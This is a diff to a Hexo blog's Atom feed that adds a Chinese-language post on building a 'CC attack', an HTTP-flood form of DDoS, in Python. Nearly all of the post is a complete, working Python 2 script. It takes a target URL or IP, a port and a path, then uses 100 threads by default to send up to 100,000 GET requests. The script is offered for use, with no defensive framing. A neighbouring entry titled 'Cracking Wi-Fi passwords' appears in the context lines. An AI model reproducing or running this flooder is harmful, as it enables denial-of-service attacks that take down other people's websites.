@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.an-time.top/"/>
-  <updated>2017-11-08T00:51:00.000Z</updated>
+  <updated>2017-11-24T02:14:48.483Z</updated>
   <id>http://www.an-time.top/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>python实现ddos攻击之cc攻击</title>
+    <link href="http://www.an-time.top/2017/11/24/python%E5%AE%9E%E7%8E%B0ddos%E6%94%BB%E5%87%BB%E4%B9%8Bcc%E6%94%BB%E5%87%BB/"/>
+    <id>http://www.an-time.top/2017/11/24/python实现ddos攻击之cc攻击/</id>
+    <published>2017-11-24T02:11:22.000Z</published>
+    <updated>2017-11-24T02:14:48.483Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h1><p>cc攻击是ddos攻击中很难防护的一种，这里参考网上一些资料，用python实现cc攻击。</p><hr><h1 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h1><pre><code>#!/usr/bin/python  #coding=utf-8  import sys  import threading  import Queue  import httplib  import argparse  def get_parse():      parser = argparse.ArgumentParser(description=&apos;A cc attack python program&apos;)      parser.add_argument(&apos;-j&apos;, help=&quot;number of total jobs, default number 100000&quot;, action=&quot;store&quot;, dest=&apos;j&apos;, default=100000, type=int)      parser.add_argument(&apos;-n&apos;, help=&quot;number of threads, default thread 100&quot;, action=&apos;store&apos;, dest=&apos;n&apos;, default=100, type=int)      parser.add_argument(&apos;-u&apos;, help=&quot;url or ip, for example: &apos;[url]www.zz2u.com[/url]&apos; or &apos;192.157.233.244&apos;&quot;, action=&quot;store&quot;, dest=&quot;u&quot;)      parser.add_argument(&apos;-i&apos;, help=&quot;index, for example: &apos;/index.php&apos;, if null input &apos;/&apos; or  not use -i,default &apos;/&apos;&quot;, action=&quot;store&quot;, dest=&quot;i&quot;, default=&quot;/&quot;)      parser.add_argument(&apos;-p&apos;, help=&quot;port, default 80 &quot;, action=&quot;store&quot;, dest=&quot;p&quot;, default=80, type=int)      if(len(sys.argv) &lt; 2):          parser.print_help()          sys.exit()      return parser.parse_args()  def get_request(url, index=&apos;/&apos;, port=80):    try:          conn = httplib.HTTPConnection(url, port, timeout=0.01)          conn.request(&quot;GET&quot;, index)          r1 = conn.getresponse()          #print r1.status, r1.reason      except:          pass  class Worker(threading.Thread):      def __init__(self, name, queue, url, index, port):          threading.Thread.__init__(self)          self.queue = queue          self.url = url          self.index =index          self.port = port          self.start()      def run(self):          # 著名的死循环，保证接着跑下一个任务          while True:              # 队列为空则退出线程              if self.queue.empty():                  break              # 获取一个项目              foo = self.queue.get()              # 模拟你要做的事情              get_request(self.url, self.index, self.port)              # 打印              print self.getName(),&apos;:&apos;, foo            # 告诉系统说任务完成              self.queue.task_done()  def start_work():      args = get_parse()      job_num = args.j      thread_num = args.n      url = args.u      index = args.i      port = args.p      #print args, job_num, thread_num, url, index      # 队列      queue = Queue.Queue()      # 加入任务队列个数      for i in range(job_num):          queue.put(i)      # 开线程个数      for i in range(thread_num):          threadName = &quot;Thread&quot; + str(i)          Worker(threadName, queue, url, index, port)  # 所有线程执行完毕后关闭      queue.join()  if __name__ == &quot;__main__&quot;:      start_work()  </code></pre><hr>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;简介：&quot;&gt;&lt;a href=&quot;#简介：&quot; class=&quot;headerlink&quot; title=&quot;简介：&quot;&gt;&lt;/a&gt;简介：&lt;/h1&gt;&lt;p&gt;cc攻击是ddos攻击中很难防护的一种，这里参考网上一些资料，用python实现cc攻击。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&quot;代码：
+      
+    
+    </summary>
+    
+    
+      <category term="ddos" scheme="http://www.an-time.top/tags/ddos/"/>
+    
+      <category term="cc" scheme="http://www.an-time.top/tags/cc/"/>
+    
+  </entry>
   
   <entry>
     <title>破解Wi-Fi密码</title>
